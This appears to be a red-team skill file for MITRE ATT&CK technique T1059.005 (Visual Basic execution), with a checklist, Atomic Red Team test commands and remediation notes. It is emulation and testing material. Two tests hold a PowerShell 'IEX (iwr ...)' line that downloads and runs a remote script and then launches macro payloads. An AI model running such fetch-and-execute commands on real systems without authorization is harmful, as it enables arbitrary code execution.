---
name: "T1059.005_visual-basic"
description: "Adversaries may abuse Visual Basic (VB) for execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1059.005
  - execution
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1059.005"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1059/005"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-94
chains_with:
  - T1059
  - T1059.001
  - T1059.002
  - T1059.003
  - T1059.004
  - T1059.006
  - T1059.007
  - T1059.008
  - T1059.009
  - T1059.010
  - T1059.011
  - T1059.012
  - T1059.013
prerequisites:
  - T1059
severity_boost:
  T1059: "Chain with T1059 for deeper attack path"
  T1059.001: "Chain with T1059.001 for deeper attack path"
  T1059.002: "Chain with T1059.002 for deeper attack path"
---

# T1059.005 Visual Basic

> **Sub-technique of:** T1059

## High-Level Description

Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.

Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Visual Basic technique is applicable to target environment
- [ ] Check Linux systems for indicators of Visual Basic
- [ ] Check macOS systems for indicators of Visual Basic
- [ ] Check Windows systems for indicators of Visual Basic
- [ ] Verify mitigations are bypassed or absent (5 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Visual Basic script execution to gather local computer information

Visual Basic execution test, execute vbscript via PowerShell.

When successful, system information will be written to $env:TEMP\T1059.005.out.txt.

**Supported Platforms:** windows

```powershell
cscript "#{vbscript}" > $env:TEMP\T1059.005.out.txt
```

**Dependencies:**

- Sample script must exist on disk at specified location (#{vbscript})

### Atomic Test 2: Encoded VBS code execution

This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution
a message box will pop up displaying "ART T1059.005"

A note regarding this module, due to the way that this module utilizes "ScriptControl" a 64bit version of Microsoft Office is required.
You can validate this by opening WinWord -> File -> Account -> About Word

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059.005-macrocode.txt" -officeProduct "Word" -sub "Exec"
```

**Dependencies:**

- The 64-bit version of Microsoft Office must be installed

### Atomic Test 3: Extract Memory via VBA

This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this
we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that
memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"
```

**Dependencies:**

- Microsoft #{ms_product} must be installed

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Visual Basic by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1059.005 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1042 Disable or Remove Feature or Program

Turn off or restrict access to unneeded VB components.

### M1049 Antivirus/Antimalware

Anti-virus can be used to automatically quarantine suspicious files.

### M1038 Execution Prevention

Use application control where appropriate. VBA macros obtained from the Internet, based on the file's Mark of the Web (MOTW) attribute, may be blocked from executing in Office applications (ex: Access, Excel, PowerPoint, Visio, and Word) by default starting in Windows Version 2203.

### M1040 Behavior Prevention on Endpoint

On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic scripts from executing potentially malicious downloaded content .

### M1021 Restrict Web-Based Content

Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place.

## Detection

### Behavioral Detection of Visual Basic Execution (VBS/VBA/VBScript)

## Risk Assessment

| Finding                           | Severity | Impact    |
| --------------------------------- | -------- | --------- |
| Visual Basic technique applicable | High     | Execution |

## CWE Categories

| CWE ID | Title                                  |
| ------ | -------------------------------------- |
| CWE-94 | Improper Control of Generation of Code |

## References

- [VB .NET Mar 2020](https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/)
- [Default VBS macros Blocking ](https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805)
- [Microsoft VBScript](<https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)>)
- [Microsoft VBA](https://docs.microsoft.com/office/vba/api/overview/)
- [VB Microsoft](https://docs.microsoft.com/dotnet/visual-basic/)
- [Wikipedia VBA](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications)
- [Atomic Red Team - T1059.005](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.005)
- [MITRE ATT&CK - T1059.005](https://attack.mitre.org/techniques/T1059/005)
